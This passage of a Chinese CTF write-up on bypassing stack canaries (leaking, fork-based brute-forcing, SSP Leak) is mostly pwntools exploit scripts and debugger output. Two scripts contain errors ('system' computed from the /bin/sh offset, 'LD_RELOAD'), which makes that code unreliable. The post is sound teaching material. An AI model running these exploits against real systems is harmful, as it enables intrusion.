class="string">'./scv'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23.so'</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./scv'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'system_offset = '</span> + hex(system_offset))</span><br><span class="line">log.success(<span class="string">'str_bin_sh_offset = '</span> + hex(str_bin_sh_offset))</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ea3</span></span><br><span class="line">log.success(<span class="string">'pop_rdi_ret = '</span> + hex(pop_rdi_ret))</span><br><span class="line">one_gadget_offset = <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">'one_gadget_offset = '</span> + hex(one_gadget_offset))</span><br><span class="line">libc_base_offset = <span class="number">0x3a20a</span></span><br><span class="line">log.success(<span class="string">'libc_base_offset = '</span> + hex(libc_base_offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'A'</span> * (<span class="number">40</span> - <span class="number">1</span>) + <span class="string">':'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'leak_addr = '</span> + hex(leak_addr))</span><br><span class="line">libc_base = leak_addr - libc_base_offset</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + str_bin_sh_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">edit(<span class="string">'A'</span> * <span class="number">168</span> + <span class="string">':'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">canary = u64(<span class="string">'\x00'</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * <span class="number">168</span>,</span><br><span class="line">	canary,</span><br><span class="line">	<span class="string">'B'</span> * <span class="number">8</span>,</span><br><span class="line">	pop_rdi_ret,</span><br><span class="line">	str_bin_sh,</span><br><span class="line">	system</span><br><span class="line">])</span><br><span class="line">edit(payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="爆破Canary"><a href="#爆破Canary" class="headerlink" title="爆破Canary"></a>爆破<code>Canary</code></h2><p><code>Canary</code>之所以被认为是安全的，是因为对其进行爆破成功率太低。以 32 位程序为例，除去最后一个<code>\x00</code>，其可能值将会是<code>0x100^3=16777216</code>（实际上由于<code>Canary</code>的生成规则会小于这个值），64 位下的<code>Canary</code>值更是远大于这个数量级。此外，一旦<code>Canary</code>爆破失败，程序就会立即结束，<code>Canary</code>值也会再次更新，使得爆破更加困难。但是同一个进程内所有的<code>Canary</code>值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。</p>
<h3 id="2017-NSCTF-pwn2"><a href="#2017-NSCTF-pwn2" class="headerlink" title="2017-NSCTF-pwn2"></a>2017-NSCTF-pwn2</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>开启了<code>Canary</code>。main 函数中看到只要每次回答<code>Y</code>，可以无限次地 fork 出新的进程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+1Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"[*] Do you love me?[Y]\n"</span>, <span class="number">0x17</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="string">'Y'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">while</span> ( v1 != <span class="string">'\n'</span> &amp;&amp; v1 )</span><br><span class="line">      ;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> ( pid )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( pid &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pid &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// son</span></span><br><span class="line">      &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// father</span></span><br><span class="line">    &#123;</span><br><span class="line">      func();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>func()</code>函数中存在<code>buffer overflow</code>，而且还存在<code>format string</code>，那这里其实是可以用这个漏洞泄漏出<code>Canary</code>的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  input_name(&amp;buf);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"[*] Welcome to the game %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] Input Your Id:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Canary</code>采用爆破的方法，libc 则可以用格式化字符串泄漏。放上逐字节爆破 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./pwn2'</span>, env=&#123;<span class="string">'LD_RELOAD'</span>:<span class="string">'./libc.so.6_x86'</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6_x86'</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'system_offset = '</span> + hex(system_offset))</span><br><span class="line">log.success(<span class="string">'str_bin_sh_offset = '</span> + hex(str_bin_sh_offset))</span><br><span class="line">libc_offset = <span class="number">0x1b2000</span></span><br><span class="line">log.success(<span class="string">'libc_offset = '</span> + hex(libc_offset))</span><br><span class="line">one_gadget_offset = <span class="number">0x3af1c</span></span><br><span class="line">log.success(<span class="string">'one_gadget_offset = '</span> + hex(one_gadget_offset))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forkNew</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'[Y]'</span>, <span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputName</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'[*] Input Your name please:'</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inputId</span><span class="params">(Id)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'[*] Input Your Id:'</span>)</span><br><span class="line">	p.send(Id)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		<span class="comment"># log.info('try ' + hex(j))</span></span><br><span class="line">		<span class="keyword">if</span> i != <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">0</span>:</span><br><span class="line">			p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			forkNew()</span><br><span class="line">		inputName(<span class="string">'%12$p\n'</span>)</span><br><span class="line">		p.recvuntil(<span class="string">'[*] Welcome to the game '</span>)</span><br><span class="line">		leak_addr = int(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">		payload = <span class="string">'A'</span> * <span class="number">16</span></span><br><span class="line">		payload += canary</span><br><span class="line">		payload += chr(j)</span><br><span class="line">		inputId(payload)</span><br><span class="line">		p.recv()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'smashing'</span> <span class="keyword">not</span> <span class="keyword">in</span>  p.recv():</span><br><span class="line">			canary += chr(j)</span><br><span class="line">			log.info(<span class="string">'At round %d find canary byte %#x'</span> %(i, j))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'canary = '</span> + hex(u32(canary)))</span><br><span class="line">log.success(<span class="string">'leak_addr = '</span> + hex(leak_addr))</span><br><span class="line">libc_base = leak_addr - libc_offset</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">log.success(<span class="string">'one_gadget = '</span> + hex(one_gadget))</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">inputName(<span class="string">'AssassinQ\n'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * <span class="number">16</span>,</span><br><span class="line">	canary,</span><br><span class="line">	<span class="string">'B'</span> * <span class="number">12</span>,</span><br><span class="line">	one_gadget</span><br><span class="line">])</span><br><span class="line">inputId(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SSP（Stack-Smashing-Protect）-Leak"><a href="#SSP（Stack-Smashing-Protect）-Leak" class="headerlink" title="SSP（Stack Smashing Protect） Leak"></a><code>SSP（Stack Smashing Protect） Leak</code></h2><p>除了通过各种方法泄露<code>Canary</code>之外，我们还可以利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们<code>get shell</code>。但是当我们需要泄露的 flag 或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP（Stack Smashing Protect） Leak</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/pics/绕过ELF的安全防护机制Canary/1.png" alt="SSP Leak"></p>
<h3 id="JarvisOJ-Smashes"><a href="#JarvisOJ-Smashes" class="headerlink" title="JarvisOJ-Smashes"></a>JarvisOJ-Smashes</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>开了<code>Canary</code>，存在溢出但是没法泄漏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4007E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets((__int64)&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  i = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    c = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i++] = c;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + <span class="number">6294816L</span>L), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - i));</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里想到<code>SSP Leak</code>，只要我们能够输入足够长的字符串覆盖掉<code>argv[0]</code>，我们就能让<code>Canary</code>保护输出我们想要地址上的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000040094E ; char s[]</span><br><span class="line">.rodata:000000000040094E s               db &apos;Thank you, bye!&apos;,0  ; DATA XREF: sub_4007E0:loc_400878↑o</span><br><span class="line">.rodata:000000000040095E                 align 20h</span><br></pre></td></tr></table></figure>
<p>尝试输出字符串 s：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">test = <span class="number">0x40094E</span></span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">p.sendline(p64(test) * <span class="number">200</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please overwrite the flag:'</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvall()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到的结果果然泄漏出来了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x4c bytes:</span><br><span class="line">    'Thank you, bye!\n'</span><br><span class="line">    '*** stack smashing detected ***: Thank you, bye! terminated\n'</span><br></pre></td></tr></table></figure>
<p>那么接下来需要做的就是找到存放 flag 的地址，在 ida 上找到是<code>0x600d21</code>，但是由于 main 函数中最后一句话<code>memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));</code>，在调用<code>__stack_chk_fail()</code>的时候，<code>0x600d21</code>上的值早就已经被覆盖成其它值了。通过 gdb 调试，发现在另一个地址也有 flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; find &apos;CTF&apos;</span><br><span class="line">Searching for &apos;CTF&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br><span class="line">smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br></pre></td></tr></table></figure>
<p>这里就涉及到了 elf 文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x00400000         0x00401000         r-xp	/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes</span><br><span class="line">0x00600000         0x00601000         rw-p	/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd7000 0x00007ffff7fda000 rw-p	mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]</span><br></pre></td></tr></table></figure>
<p>那么 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">test = <span class="number">0x40094E</span></span><br><span class="line">flag = <span class="number">0x400d20</span></span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">p.sendline(p64(flag) * <span class="number">200</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please overwrite the flag:'</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvall()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>直接“挖”到 canary 产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使 canary 值可控。</p>
